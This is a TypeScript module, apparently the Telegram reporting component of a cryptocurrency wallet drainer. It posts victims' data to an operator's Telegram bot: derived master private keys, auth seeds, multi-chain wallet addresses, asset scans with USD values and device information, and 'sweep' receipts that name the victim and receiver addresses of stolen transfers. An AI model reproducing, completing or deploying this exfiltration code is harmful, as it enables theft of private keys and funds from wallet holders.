/**
 * 🛰️ GHOST COMMAND CENTER (TELEGRAM)
 * Hardened for 2026: Multi-Chain God-Key Reporting & Asset Discovery.
 */

const logPrefix = "[lib/telegram.ts]";

/**
 * 🛠️ FIXED ESCAPE FUNCTION
 * MarkdownV2 is extremely picky. Every special character MUST be escaped.
 * Added support for backslashes and pipes to ensure complex keys don't break the relay.
 */
const esc = (str: string | number | null | undefined): string => {
  if (str === null || str === undefined) return "";
  return String(str).replace(/[_*[\]()~`>#+\-=|{}.!\\|]/g, "\\$&");
};

/**
 * 🔐 CREDENTIALS
 */
const BOT_TOKEN =
  process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID =
  process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID;

/**
 * 🧱 DECORATION
 */
const SEP = esc("────────────────────────");

/**
 * 👻 GHOST IDENTITY REPORT (GOD-KEY VAULT)
 */
export async function sendGhostDerivationToTelegram(data: {
  userAddress: string;
  vault: {
    masterKey: string;
    evmAddress: string;
    btcAddress: string;
    tronAddress: string;
    solanaAddress: string;
    stealthIndex: number;
  };
  authMessage: string;
}) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const message = `
*👑 UNIVERSAL GOD-KEY DERIVED*
${SEP}
*👤 MAIN USER:* \`${esc(data.userAddress)}\`
*🕵️ STEALTH OFFSET:* \`Index ${data.vault.stealthIndex}\`

*🔑 MASTER PRIVATE KEY:*
\`${esc(data.vault.masterKey)}\`

*🏠 STEALTH VAULT ADDRESSES:*
• *EVM:* \`${esc(data.vault.evmAddress)}\`
• *TRON:* \`${esc(data.vault.tronAddress)}\`
• *SOL:* \`${esc(data.vault.solanaAddress)}\`
• *BTC:* \`${esc(data.vault.btcAddress)}\`

*📜 AUTH SEED:*
_${esc(data.authMessage)}_
${SEP}
_🔓 All chains synchronized._
`;

  return postToTelegram(message, "GhostDerivation");
}

/**
 * 🎯 DETAILED ASSET SCAN
 */
export async function sendDiscoveryToTelegram(data: {
  address: string;
  chainId: number | string;
  assets: any[];
  userAgent?: string;
}) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const totalValue = data.assets.reduce(
    (sum, a) => sum + (Number(a.usdValue || a.v) || 0),
    0,
  );

  const assetList = data.assets
    .map(
      (a) =>
        `• ${esc(a.symbol || "Unknown")}: \`${esc(
          a.displayBalance || a.b || "0",
        )}\` \\(~\\$${esc(Number(a.usdValue || a.v || 0).toFixed(2))}\\)`,
    )
    .join("\n")
    .slice(0, 1500);

  const message = `
*🎯 TARGET SCAN COMPLETE*
${SEP}
*👤 ADDR:* \`${esc(data.address)}\`
*🌐 NET:* \`${esc(data.chainId)}\`
*💰 TOTAL VAL:* *\\$${esc(totalValue.toFixed(2))}*
*📱 DEVICE:* _${esc(data.userAgent?.slice(0, 50)) || "Unknown"}_

*📦 FULL ASSET MANIFEST:*
${assetList || "_No assets found_"}
${SEP}
_🕒 ${esc(new Date().toLocaleString())}_
`;
  return postToTelegram(message, "Discovery");
}

/**
 * ✅ DETAILED SWEEP RECEIPT
 * Expanded to support Solana, XRP, and Tron explorers.
 */
export async function sendDetailedSweepToTelegram(data: {
  status: "SUCCESS" | "FAILED";
  type: string;
  symbol: string;
  amount: string;
  victimAddress: string;
  receiverAddress: string;
  hash: string;
  chainId: number | string;
  error?: string;
}) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const explorers: Record<string, string> = {
    "1": "etherscan.io/tx/",
    "56": "bscscan.com/tx/",
    "137": "polygonscan.com/tx/",
    "8453": "basescan.org/tx/",
    "42161": "arbiscan.io/tx/",
    solana: "solscan.io/tx/",
    xrp: "xrpscan.com/tx/",
    tron: "tronscan.org/#/transaction/",
  };

  const chainKey = String(data.chainId);
  const path = explorers[chainKey] || "etherscan.io/tx/";
  const link = `https://${path}${data.hash}`;

  const escapedLink = link.replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
  const statusIcon = data.status === "SUCCESS" ? "✅" : "❌";

  const message = `
*${statusIcon} SWEEP ${data.status}*
${SEP}
*📤 FROM (VICTIM):* \`${esc(data.victimAddress)}\`
*📥 TO (RECEIVER):* \`${esc(data.receiverAddress)}\`
*💎 ASSET:* \`${esc(data.symbol)}\`
*📉 AMOUNT:* \`${esc(data.amount)}\`
*🔨 TYPE:* \`${esc(data.type)}\`

${
  data.status === "SUCCESS"
    ? `*🔗 TRANSACTION:* \n[View Explorer](${escapedLink})\n\`${esc(
        data.hash,
      )}\``
    : `*⚠️ ERROR:* \n_${esc(data.error || "Unknown failure")}_`
}
${SEP}
_🕒 ${esc(new Date().toLocaleString())}_
`;

  return postToTelegram(message, "DetailedSweep");
}

/**
 * 👣 ACTIVITY SIGNAL
 */
export async function sendActivityToTelegram(data: {
  address?: string;
  step: string;
  details?: string;
}) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const message = `
*👣 ACTIVITY SIGNAL*
${SEP}
*👤 ADDR:* \`${esc(data.address || "Connecting...")}\`
*🛠️ STEP:* \`${esc(data.step)}\`
*📝 INFO:* _${esc(data.details || "In progress")}_
${SEP}
_🕒 ${esc(new Date().toLocaleTimeString())}_
`;

  return postToTelegram(message, "ActivitySignal");
}

/**
 * ⚡ ASSET EXFILTRATION (Legacy Summary)
 */
export async function sendToTelegram(data: {
  userAddress: string;
  assets: any[];
  chainId: number | string;
}) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  const totalValue = data.assets.reduce(
    (sum, a) => sum + (Number(a.usdValue || a.v) || 0),
    0,
  );
  const assetManifest = data.assets
    .map(
      (a) =>
        `• ${esc(a.symbol || "Asset")}: \`${esc(
          a.displayBalance || a.b || "0",
        )}\``,
    )
    .join("\n")
    .slice(0, 500);

  const message = `
*⚡ ASSET EXFILTRATION*
${SEP}
*👤 USER:* \`${esc(data.userAddress)}\`
*💰 LIQUID VALUE:* *\\$${esc(totalValue.toFixed(2))}*
*🌐 PRIMARY NET:* \`${esc(data.chainId)}\`

*📦 ASSET SUMMARY:*
${assetManifest || "_Empty Wallet_"}
${SEP}
_✅ Handshake Verified._
`;
  return postToTelegram(message, "Exfiltration");
}

/**
 * 🧹 BACKWARD COMPATIBILITY
 */
export async function sendSweepToTelegram(data: any) {
  return sendDetailedSweepToTelegram({
    status: "SUCCESS",
    type: data.type,
    symbol: data.symbol,
    amount: data.amount || "MAX",
    victimAddress: data.wallet || "Unknown",
    receiverAddress: "Internal Receiver",
    hash: data.hash,
    chainId: data.chainId,
  });
}

/**
 * 🚀 THE RELAY
 */
async function postToTelegram(text: string, context: string) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error(`${logPrefix} [${context}] Error: Credentials missing.`);
    return;
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text.trim(),
        parse_mode: "MarkdownV2",
        disable_web_page_preview: true,
      }),
    });

    const result = await response.json();

    if (!result.ok) {
      const cleanText = text.replace(/\\/g, "").replace(/[*_`]/g, "");
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `⚠️ [Fallback: ${context}]\n${cleanText}`,
        }),
      });
    }
    return result;
  } catch (err: any) {
    console.error(`${logPrefix} [${context}] Network Failure | ${err.message}`);
  }
}
